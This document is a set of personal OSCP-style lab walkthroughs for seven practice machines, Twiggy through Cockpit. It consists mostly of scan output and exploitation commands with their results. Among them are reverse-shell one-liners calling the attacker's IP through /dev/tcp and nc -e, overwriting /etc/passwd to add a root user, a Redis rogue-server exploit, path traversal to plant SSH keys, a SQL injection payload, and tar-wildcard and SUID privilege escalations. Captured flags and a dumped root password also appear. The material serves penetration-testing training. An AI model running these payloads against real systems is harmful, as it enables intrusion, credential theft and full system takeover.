
## Twiggy

1. Rustscan 
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ rustscan 192.168.235.62 

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack
53/tcp   open  domain   syn-ack
80/tcp   open  http     syn-ack
4505/tcp open  unknown  syn-ack
4506/tcp open  unknown  syn-ack
8000/tcp open  http-alt syn-ack
```

2. Nmap
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ nmap -p$(cat twiggy-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.235.62
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-07 05:43 EST
Nmap scan report for 192.168.235.62
Host is up (0.30s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: nginx/1.16.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.04 seconds
```


2. ZeroMQ ZMTP 2.0 vulnerable with exploit, it's github and exploit db exploits are not broken. 

3. Basically, we have to add new root user and ssh login with it. 
```
https://github.com/jasperla/CVE-2020-11651-poc/blob/master/README.md

python3 exploit.py --master 192.168.187.62 --upload-src newroot --upload-dest ../../../../etc/passwd

newroot

ram:$1$96Q5Pntb$7h9hNPxRmiDbPbXYXTJ7w0:0:0:root:/root:/bin/bash
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:998:996::/var/lib/chrony:/sbin/nologin
mezz:x:997:995::/home/mezz:/bin/false
nginx:x:996:994:Nginx web server:/var/lib/nginx:/sbin/nologin
named:x:25:25:Named:/var/named:/sbin/nologin

```

## Exfiltrated

1. Rustscan 
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ rustscan 192.168.235.163 

Open 192.168.235.163:22
Open 192.168.235.163:80
```

2. Nmap
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ nmap -A -T4 -p 22,80 192.168.235.163 -Pn
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-07 07:22 EST
Nmap scan report for 192.168.235.163
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.71 seconds
```

3. Added webpage on /etc/hosts, Found login page on /panel, and found exploit for it as well as default creds. 
```
http://exfiltrated.offsec/panel/

https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE

admin:admin
```

4. Exploit and obtained shell. 
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ python3 SubrionRCE.py -u http://192.168.235.163/panel/ -l admin -p admin

$ whoami
www-data
```

5. Receive better shell
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ cat bashrev.sh 
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.206/4444 0>&1

$ wget http://192.168.45.206/bashrev.sh
$ ls
bashrev.sh
emlnlkkiqgqyeph.phar
$ chmod 777 bashrev.sh
$ ./bashrev.sh

┌──(kali㉿kali)-[~/OSCP/pg]
└─$ sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.206] from (UNKNOWN) [192.168.235.163] 46378
bash: cannot set terminal process group (973): Inappropriate ioctl for device
bash: no job control in this shell
www-data@exfiltrated:/var/www/html/subrion/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

6. Find out corn jobs for privilege escalation 
```
www-data@exfiltrated:/$ cat /etc/crontab 
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh


cat /opt/image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 
echo -ne "\\n metadata directory cleaned! \\n\\n"
IMAGES='/var/www/html/subrion/uploads'
META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"
echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done
echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

7. Used exiftool image privilege's escalation 
```
https://github.com/UNICORDev/exploit-CVE-2021-22204?tab=readme-ov-file

a. Created image.png file 
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ sudo python3 exploit-CVE-2021-22204.py -s 192.168.45.206 4445

b. Upload using http.
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.45.206/image.jpg

c. Obtained root reverse shell. 
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ sudo nc -nvlp 4445             
listening on [any] 4445 ...
connect to [192.168.45.206] from (UNKNOWN) [192.168.235.163] 44558
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

8. Proof.txt and user.txt
```
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
proof.txt
snap
# cat proof.txt
ae763085e08e42b28a50835cf2faf6f8
# cd /home
# ls
coaran
# cd coaran
# ls
local.txt
# cat local.txt
faf40abdc298356a7be381671133b07c
```

## Pelican
1. Rustscan 
```
──(kali㉿kali)-[~/OSCP/htb]
└─$ rustscan 192.168.169.98  

PORT      STATE SERVICE         REASON
22/tcp    open  ssh             syn-ack
139/tcp   open  netbios-ssn     syn-ack
445/tcp   open  microsoft-ds    syn-ack
631/tcp   open  ipp             syn-ack
2181/tcp  open  eforward        syn-ack
2222/tcp  open  EtherNetIP-1    syn-ack
8080/tcp  open  http-proxy      syn-ack
8081/tcp  open  blackice-icecap syn-ack
37753/tcp open  unknown         syn-ack
```

2. Nmap
```
┌──(kali㉿kali)-[~/OSCP/htb]
└─$ nmap -p$(cat pelican-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.169.98
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 06:02 EST
Nmap scan report for 192.168.169.98
Host is up (0.33s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
|_http-server-header: CUPS/2.2 IPP/2.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-title: Forbidden - CUPS v2.2.10
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp  open  http        nginx 1.14.2
|_http-title: Did not follow redirect to http://192.168.169.98:8080/exhibitor/v1/ui/index.html
|_http-server-header: nginx/1.14.2
37753/tcp open  java-rmi    Java RMI
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2024-03-08T06:03:19-05:00
|_clock-skew: mean: 1h40m02s, deviation: 2h53m15s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-03-08T11:03:17
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.40 seconds
```

3. Changed ip hostname, access to webpage. 
```
http://pelican:8080

It's automatically directs to another zookepper page. 
http://pelican:8080/exhibitor/v1/ui/index.html
```

4. Made the config page editable , then added reverse bash script and commit it all. Obtained reverse shell and local.txt. 
```
$(nc -e /bin/bash 192.168.45.201 8888 &)

┌──(kali㉿kali)-[~/OSCP/htb]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.45.201] from (UNKNOWN) [192.168.169.98] 60602
id
uid=1000(charles) gid=1000(charles) groups=1000(charles)

charles@pelican:~$ cat local.txt
cat local.txt
71a9928754d7148191361c5d459da404
```

5. Sudo permission check and tried to execute. 
```
charles@pelican:~$ sudo -l
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
charles@pelican:~$ sudo gcore $PID
sudo gcore $PID
usage:  gcore [-a] [-o filename] pid
```

6. Download linpeas in /tmp folder and execute it. Figured out pid for root user password. 
```
root       484  0.0  0.0   2276    72 ?        Ss   05:58   0:00 /usr/bin/password-store

charles@pelican:/tmp$ sudo gcore -a -o /home/charles/output 484
sudo gcore -a -o /home/charles/output 484
0x00007f93538436f4 in __GI___nanosleep (requested_time=requested_time@entry=0x7ffcefd76200, remaining=remaining@entry=0x7ffcefd76200) at ../sysdeps/unix/sysv/linux/nanosleep.c:28
28      ../sysdeps/unix/sysv/linux/nanosleep.c: No such file or directory.
Saved corefile /home/charles/output.484
[Inferior 1 (process 484) detached]
```

7. Checked out output.484 with string. 
```
charles@pelican:~$ strings output.484

001 Password: root:
ClogKingpinInning731
```

8. Obtained root and proof.txt
```
root@pelican:~# cat proof.txt
cat proof.txt
f15c611cecf08e2f4cbc5367a6632f1c
```

## Astronaut
1. Rustscan
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

2. Nmap
```
┌──(kali㉿kali)-[~/OSCP/htb]
└─$ nmap -p$(cat astronaut-open-ports.txt | cut -f1 -d '/' | tr '\n' ',') -T4 -A 192.168.222.12
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 09:31 EDT
Nmap scan report for 192.168.222.12
Host is up (0.31s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2021-03-17 17:46  grav-admin/
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.99 seconds
```

3. Find Grav CMS and exploit for it. 
```
https://www.exploit-db.com/exploits/49973
https://github.com/CsEnox/CVE-2021-21425
```

4. Run exploit after changing base64 of reverse shell
```
┌──(kali㉿kali)-[~/OSCP/pg]
└─$ python3 49973.py 

┌──(kali㉿kali)-[~/OSCP/pg]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.222.12] 42598
bash: cannot set terminal process group (2553): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gravity:~/html/grav-admin$ 
```

5. Found php SUID, exploit it, obtained proof.txt
```
www-data@gravity:/$ /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
whoami
root
cat proof.txt
c340e04fa4942914f904779052eaca3b
```

## Blackgate

1. Rustscan and nmap 
```
 nmap -A -T4 -p22,6379 192.168.222.176
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 11:11 EDT
Nmap scan report for 192.168.222.176
Host is up (0.30s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 37:21:14:3e:23:e5:13:40:20:05:f9:79:e0:82:0b:09 (RSA)
|   256 b9:8d:bd:90:55:7c:84:cc:a0:7f:a8:b4:d3:55:06:a7 (ECDSA)
|_  256 07:07:29:7a:4c:7c:f2:b0:1f:3c:3f:2b:a1:56:9e:0a (ED25519)
6379/tcp open  redis   Redis key-value store 4.0.14
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.80 seconds

```

2. Tried multiple exploit for Redis. One work at end. Got a initial shell. 
```
https://github.com/n0b0dyCN/redis-rogue-server?source=post_page-----5af94f385341--------------------------------

python3 redis-rogue-server.py --rhost 192.168.222.176 --lhost 192.168.45.198 --lport 80 
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 192.168.222.176:6379
[info] SERVER 192.168.45.198:80
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: r
[info] Open reverse shell...
Reverse server address: 192.168.45.198
Reverse server port: 4444
[info] Reverse shell payload sent.
[info] Check at 192.168.45.198:4444
[info] Unload module...


nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.198] from (UNKNOWN) [192.168.222.176] 46170
id
uid=1001(prudence) gid=1001(prudence) groups=1001(prudence)
whoami
prudence
```


3. Obtained local.txt
```
prudence@blackgate:/home/prudence$ cat local.txt
cat local.txt
caa48c240a9137f5aafc81bafa328015
```

4. Use of pwnkit to root. Got root.txt
```
prudence@blackgate:/home/prudence$ ./PwnKit
./PwnKit
root@blackgate:/home/prudence# whoami
whoami
root

root@blackgate:~# cat proof.txt
cat proof.txt
0cb9e7cb62f63dad3ebc223beafab867
```


## Boolean 
1. Rustscan and nmap
```

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp    open  http
| http-title: Boolean
|_Requested resource was http://192.168.247.231/login
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|_    Content-Length: 0
33017/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Development
|_http-server-header: Apache/2.4.38 (Debian)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=3/12%Time=65F117F0%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,55,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/ht
SF:ml;\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(HTTPOptions,55
SF:,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x20chars
SF:et=UTF-8\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,1C,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\n\r\n")%r(FourOhFourRequest,55,"HTTP/1\.0\x20403\x20For
SF:bidden\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Lengt
SF:h:\x200\r\n\r\n")%r(GenericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\n\r\n")%r(RPCCheck,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%
SF:r(DNSVersionBindReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")
SF:%r(DNSStatusRequestTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")
SF:%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SSLSessionRe
SF:q,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalServerCook
SF:ie,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLSSessionReq,1C,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,1C,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request\r\n\r\n")%r(LPDString,1C,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\n\r\n")%r(LDAPSearchReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\n\r\n")%r(LDAPBindReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n"
SF:)%r(SIPOptions,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(LANDe
SF:sk-RC,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TerminalServer
SF:,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(NCP,1C,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\n\r\n")%r(NotesRPC,1C,"HTTP/1\.1\x20400\x20Ba
SF:d\x20Request\r\n\r\n")%r(JavaRMI,1C,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\n\r\n")%r(WMSRequest,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n"
SF:)%r(oracle-tns,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(ms-sq
SF:l-s,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(afp,1C,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\n\r\n")%r(giop,1C,"HTTP/1\.1\x20400\x20Bad
SF:\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.84 seconds
```

2. Tried to get initial foothold. 
a. Created a new account with sam:sam, sam@email.com creds. 
b. Intercept the traffic for changing email address after logging in. 
c. change the last parameter starting with '-method'. Change 'email' with 'confirmed'
d. Re-login, a file manager is seen. Upload simple-backdoor.php file on it. 
e. Access /etc/passwd 
```
GET /?cwd=../../../../../etc&file=passwd&download=true HTTP/1.

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
remi:x:1000:1000::/home/remi:/bin/bash
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
```
f. Access remi user ssh keys with this url. http://192.168.247.231/?cwd=../../../../../../../home/remi/.ssh
g. Generate your own keys, upload .pub file after moving it to 'authorized_keys' Make sure to upload under .ssh folder and with 'authorized_keys' name
h. Ssh login, get foothold and local.txt
```
sudo ssh -i god remi@192.168.247.231 
Enter passphrase for key 'god': 
Linux boolean 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Mar 12 22:10:32 2024 from 192.168.45.198
remi@boolean:~$ ls
boolean  local.txt
```

3. Used linpeas, found root keys, tried to ssh, unsuccessful
```
remi@boolean:~/.ssh/keys$ ssh -i root root@127.0.0.1Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
Disconnected from 127.0.0.1 port 22
```

4. Find out alias so using it. 
```
remi@boolean:~$ alias
alias ls='ls --color=auto'
alias root='ssh -l root -i ~/.ssh/keys/root 127.0.0.1'
remi@boolean:~$ root
Linux boolean 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@boolean:~# id
uid=0(root) gid=0(root) groups=0(root)
root@boolean:~# ls
proof.txt
root@boolean:~# cat proof.txt
06d18d7f996c82ab2e919f4c6913b9ef


# If there is not any issues use this commands
ssh -l root -i ~/.ssh/keys/root 127.0.0.1 -o IdentitiesOnly=true
```
## Clue 
It requires SMB port to be open for solving, but this machine do not have smb port open. 

## Cockpit
1. Rustscan 
```
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack
80/tcp   open  http       syn-ack
9090/tcp open  zeus-admin syn-ack
```

2. Nmap 
```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp   open  http            Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
9090/tcp open  ssl/zeus-admin?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=blaze/organizationName=d2737565435f491e97f49bb5b34ba02e
| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost
| Not valid before: 2024-03-17T01:21:26
|_Not valid after:  2124-02-22T01:21:26
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
```

3. Found login page '/login.php' and performed sql injection. Obtained 2 base64 passwords. 
```
username - asd' union select 1,2,3,4,5 -- -
password - null

cameron - thisscanttbetouchedd@455152
james - canttouchhhthiss@455152
```

4. Used james creds to login in port 9090. 

5. Found terminal and local.txt
```
james@blaze:~$ cat local.txt
efc23ac5a6ee7d760eea375838355970
```

6. Found wildcard for sudo -l. Performed privelege escalation. Obtained root.txt
```
james@blaze:~$ sudo -l
(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *

echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/james/shell.sh  
echo "" > "--checkpoint-action=exec=sh shell.sh"  
echo "" > --checkpoint=1

sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *

james@blaze:~$ /tmp/bash -p
/tmp/bash -p
id
